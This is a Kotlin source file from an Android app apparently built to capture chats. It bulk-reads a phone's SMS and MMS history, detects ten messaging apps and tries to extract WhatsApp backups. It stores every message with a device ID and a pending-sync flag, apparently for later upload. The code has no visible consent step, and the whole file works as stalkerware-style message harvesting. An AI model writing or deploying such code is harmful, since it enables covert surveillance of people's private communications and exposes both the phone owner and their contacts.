package com.chats.capture.utils

import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.Telephony
import com.chats.capture.CaptureApplication
import com.chats.capture.database.ChatDao
import com.chats.capture.managers.DeviceRegistrationManager
import com.chats.capture.models.ChatData
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import timber.log.Timber
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * Captures existing messages from messaging apps
 * Note: Most apps encrypt their databases, so direct extraction may be limited
 * Alternative: Use AccessibilityService to scroll through chat history (not implemented here)
 */
class MessageHistoryCapture(private val context: Context) {
    
    private val chatDao: ChatDao = (context.applicationContext as CaptureApplication).database.chatDao()
    private val deviceRegistrationManager = DeviceRegistrationManager(context)
    
    private val targetAppPackages = mapOf(
        "com.whatsapp" to "WhatsApp",
        "com.instagram.android" to "Instagram",
        "com.facebook.katana" to "Facebook",
        "com.facebook.orca" to "Messenger",
        "org.telegram.messenger" to "Telegram",
        "com.snapchat.android" to "Snapchat",
        "com.twitter.android" to "Twitter",
        "com.discord" to "Discord",
        "com.viber.voip" to "Viber",
        "com.skype.raider" to "Skype"
    )
    
    /**
     * Capture all existing messages from messaging apps
     */
    suspend fun captureAllMessages(): List<ChatData> = withContext(Dispatchers.IO) {
        try {
            val deviceId = deviceRegistrationManager.getDeviceId()
            val allMessages = mutableListOf<ChatData>()
            
            // Capture SMS/MMS history via system providers (works without app-specific DB access)
            allMessages.addAll(captureSmsHistory(deviceId))
            allMessages.addAll(captureMmsHistory(deviceId))

            // Check which target apps are installed
            val installedApps = getInstalledMessagingApps()
            
            Timber.d("Found ${installedApps.size} installed messaging apps")
            
            // Attempt to extract messages from each app
            // Note: Most apps encrypt their databases, so this will likely return empty
            installedApps.forEach { (packageName, appName) ->
                try {
                    val messages = attemptMessageExtraction(packageName, appName, deviceId)
                    if (messages.isNotEmpty()) {
                        allMessages.addAll(messages)
                        Timber.d("Extracted ${messages.size} messages from $appName")
                    } else {
                        Timber.v("No messages extracted from $appName (database may be encrypted or inaccessible)")
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error extracting messages from $appName")
                }
            }
            
            // Save to database
            allMessages.forEach { chat ->
                try {
                    // Check for duplicates
                    val existing = chatDao.findDuplicateChat(
                        chat.appPackage,
                        chat.text,
                        chat.timestamp
                    )
                    
                    if (existing == null) {
                        chatDao.insertChat(chat)
                    }
                } catch (e: Exception) {
                    Timber.e(e, "Error saving message")
                }
            }
            
            Timber.d("Captured ${allMessages.size} existing messages from all apps")
            allMessages
        } catch (e: Exception) {
            Timber.e(e, "Error capturing message history")
            emptyList()
        }
    }
    
    private fun captureSmsHistory(deviceId: String?): List<ChatData> {
        val messages = mutableListOf<ChatData>()
        try {
            val resolver = context.contentResolver
            val cursor = resolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE
                ),
                null,
                null,
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                val addressIdx = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndexOrThrow(Telephony.Sms.DATE)

                while (it.moveToNext()) {
                    val address = it.getString(addressIdx) ?: "unknown"
                    val body = it.getString(bodyIdx) ?: ""
                    val timestamp = it.getLong(dateIdx)
                    if (body.isBlank()) {
                        continue
                    }
                    messages.add(
                        ChatData(
                            deviceId = deviceId,
                            appPackage = "sms",
                            appName = "SMS",
                            chatIdentifier = address,
                            chatName = address,
                            text = body,
                            timestamp = timestamp,
                            synced = false
                        )
                    )
                }
            }
            Timber.d("Captured ${messages.size} SMS messages")
        } catch (e: SecurityException) {
            Timber.w(e, "SMS permission denied")
        } catch (e: Exception) {
            Timber.e(e, "Error capturing SMS history")
        }
        return messages
    }

    private fun captureMmsHistory(deviceId: String?): List<ChatData> {
        val messages = mutableListOf<ChatData>()
        try {
            val resolver = context.contentResolver
            val mmsUri = Uri.parse("content://mms")
            val cursor = resolver.query(
                mmsUri,
                arrayOf("_id", "date", "sub"),
                null,
                null,
                "date DESC"
            )

            cursor?.use {
                val idIdx = it.getColumnIndexOrThrow("_id")
                val dateIdx = it.getColumnIndexOrThrow("date")
                val subIdx = it.getColumnIndexOrThrow("sub")

                while (it.moveToNext()) {
                    val id = it.getString(idIdx)
                    val timestamp = it.getLong(dateIdx) * 1000L
                    val subject = it.getString(subIdx) ?: ""
                    val text = readMmsText(resolver, id)
                    val address = readMmsAddress(resolver, id)
                    val messageText = if (text.isNotBlank()) text else subject
                    if (messageText.isBlank()) {
                        continue
                    }
                    messages.add(
                        ChatData(
                            deviceId = deviceId,
                            appPackage = "mms",
                            appName = "MMS",
                            chatIdentifier = address ?: "unknown",
                            chatName = address ?: "unknown",
                            text = messageText,
                            timestamp = timestamp,
                            synced = false
                        )
                    )
                }
            }
            Timber.d("Captured ${messages.size} MMS messages")
        } catch (e: SecurityException) {
            Timber.w(e, "MMS permission denied")
        } catch (e: Exception) {
            Timber.e(e, "Error capturing MMS history")
        }
        return messages
    }

    private fun readMmsText(resolver: android.content.ContentResolver, messageId: String): String {
        val partUri = Uri.parse("content://mms/part")
        val cursor = resolver.query(
            partUri,
            arrayOf("_id", "ct", "text", "_data"),
            "mid=?",
            arrayOf(messageId),
            null
        )
        if (cursor == null) {
            return ""
        }
        cursor.use {
            val idIdx = it.getColumnIndexOrThrow("_id")
            val ctIdx = it.getColumnIndexOrThrow("ct")
            val textIdx = it.getColumnIndexOrThrow("text")
            val dataIdx = it.getColumnIndexOrThrow("_data")
            while (it.moveToNext()) {
                val contentType = it.getString(ctIdx) ?: ""
                if (contentType == "text/plain") {
                    val text = it.getString(textIdx)
                    if (!text.isNullOrBlank()) {
                        return text
                    }
                    val data = it.getString(dataIdx)
                    if (!data.isNullOrBlank()) {
                        return readMmsPartText(resolver, it.getString(idIdx))
                    }
                }
            }
        }
        return ""
    }

    private fun readMmsPartText(resolver: android.content.ContentResolver, partId: String): String {
        return try {
            val partUri = Uri.parse("content://mms/part/$partId")
            resolver.openInputStream(partUri)?.use { input ->
                BufferedReader(InputStreamReader(input)).readText()
            } ?: ""
        } catch (e: Exception) {
            ""
        }
    }

    private fun readMmsAddress(resolver: android.content.ContentResolver, messageId: String): String? {
        val addrUri = Uri.parse("content://mms/$messageId/addr")
        val cursor = resolver.query(
            addrUri,
            arrayOf("address", "type"),
            "type=137",
            null,
            null
        )
        if (cursor == null) {
            return null
        }
        cursor.use {
            return if (it.moveToFirst()) {
                it.getString(it.getColumnIndexOrThrow("address"))
            } else {
                null
            }
        }
    }

    /**
     * Get list of installed messaging apps
     */
    private fun getInstalledMessagingApps(): Map<String, String> {
        val installed = mutableMapOf<String, String>()
        val pm = context.packageManager
        
        targetAppPackages.forEach { (packageName, appName) ->
            try {
                pm.getPackageInfo(packageName, 0)
                installed[packageName] = appName
            } catch (e: PackageManager.NameNotFoundException) {
                // App not installed, skip
            } catch (e: Exception) {
                Timber.w(e, "Error checking if $packageName is installed")
            }
        }
        
        return installed
    }
    
    /**
     * Attempt to extract messages from app database
     */
    private suspend fun attemptMessageExtraction(
        packageName: String,
        appName: String,
        deviceId: String?
    ): List<ChatData> {
        // Attempt WhatsApp backup extraction if target is WhatsApp
        if (packageName == "com.whatsapp") {
            val extractor = WhatsAppBackupExtractor(context)
            return extractor.extractMessages()
        }

        Timber.v("Message extraction for $appName not available (database likely encrypted)")
        return emptyList()
    }
}
